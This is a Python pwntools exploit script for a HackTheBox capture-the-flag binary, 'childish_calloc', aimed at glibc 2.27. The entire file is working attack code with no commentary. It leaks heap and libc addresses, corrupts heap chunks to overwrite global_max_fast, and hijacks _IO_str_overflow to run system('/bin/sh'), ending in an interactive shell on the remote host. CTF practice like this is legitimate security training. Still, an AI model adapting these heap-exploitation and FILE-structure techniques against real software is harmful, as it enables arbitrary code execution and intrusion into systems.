#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Utils
def findsmall(idx,space,data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("index: ",f"{idx}")
	io.sendlineafter("it: ",f"{space}")
	io.sendafter("details: ",data)

def fixtoy(idx,newspace,data=None,choice=2):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("index: ",f"{idx}")
	io.sendlineafter("repair: ",f"{newspace}")
	if newspace > 0x1f and newspace <= 0x38:
		io.sendafter("details: \n",data)
		io.sendlineafter("choice: ",f"{choice}")
		return io.recvline().strip()

def examine(idx):
	io.sendlineafter("Choice: ","3")
	io.sendlineafter("index: ",f"{idx}")
	return io.recvline().strip()

def largemalloc(size):
	io.sendlineafter("Choice: ","4")
	io.sendlineafter("toy: ",f"{size}")

# libc 2.27
small_bin_offset = 0x3ebcc0
global_max_fast = 0x3ed940
system = 0x4f440
str_bin_sh = 0x1b3e9a
_IO_file_jumps = 0x3e82a0
_IO_str_jumps = _IO_file_jumps+0xc0
_IO_str_overflow = _IO_str_jumps+0x18

#Exploit
if __name__=="__main__":
#	io = process("./childish_calloc",env={"LD_PRELOAD":"./libc.so.6"})
	io = remote("docker.hackthebox.eu",31603)

	findsmall(0,0x28,"HK") #0
	findsmall(1,0x38,"HK") #1
	findsmall(2,0x38,p64(0x41)*7) #2
	fixtoy(2,0x88)
	fixtoy(1,0x88)
	fixtoy(0,0x88)
	findsmall(3,0x28,"A"*0x28+"\x43") #3
	heap_base = u64(fixtoy(0,0x38,"\xd0",1).ljust(8,b"\0")) - 0x5d0
	print(hex(heap_base))

	largemalloc(0x17d8)
	libc_leak = u64(examine(3).ljust(8,b"\0"))
	libc_base = libc_leak - small_bin_offset
	print(hex(libc_base))
	fixtoy(3,0x88)

	findsmall(4,0x28,p64(libc_base+small_bin_offset)+p64(libc_base+small_bin_offset)+p64(0)*3+b"\x41") #4	
	fixtoy(0,0x38,p64(0)*5+p64(0x41),2)
	findsmall(5,0x38,"HK") #5
	fixtoy(5,0x88)
	fixtoy(0,0x88)
	fixtoy(5,0x88)
	fixtoy(0,0x38,p64(heap_base+0x5a0)+p64(0x41)*2+p64(0x41))
	findsmall(6,0x38,"HK") #6
	findsmall(7,0x38,p64(0)+p64(0x41)) #7
	
	findsmall(8,0x38,p64(0)*5+p64(0x17e1)) #8
	fixtoy(7,0x38,p64(0)+p64(0x17e1+0x30))
	fixtoy(8,0x88)
	fixtoy(7,0x38,p64(0)+p64(0x41)+p64(0)+p64(libc_base+global_max_fast-0x10))
	findsmall(9,0x38,p64(0x21)*5+p64(0x1811)+p64(0x21)+b"\x41") #9
	fixtoy(9,0x88)
	fixtoy(7,0x38,p64(0)+p64(0x41)+p64(heap_base+0x608)*4)	
	findsmall(10,0x38,p64(heap_base+0x5e0)*3+p64(libc_base+str_bin_sh)+p64(0)*1+p64(0x17e1)) #10
	findsmall(11,0x38,p64(0)*2+p64(libc_base+global_max_fast-0x10)+p64(0)*4+p8(0x41)) #11	
	fixtoy(10,0x88)
	fixtoy(7,0x38,p64(0)+p64(0x41)+p64(heap_base+0x648))		
	findsmall(12,0x38,p64(0)*3+p64((libc_base+str_bin_sh-100)//2)+p64(0)*1+p64(0x17e1)+p64((libc_base+str_bin_sh-100)//2)) #12
	findsmall(13,0x38,p64(0)*4+p64(libc_base+_IO_str_overflow-0x38)+p64(libc_base+0x10a38c)+b"\x41") #13
	fixtoy(7,0x38,p64(0)+p64(0x17e1+0x30)+p64(0)*3+p64((libc_base+str_bin_sh-100)//2)+p64(0))
	fixtoy(12,0)
	io.interactive()
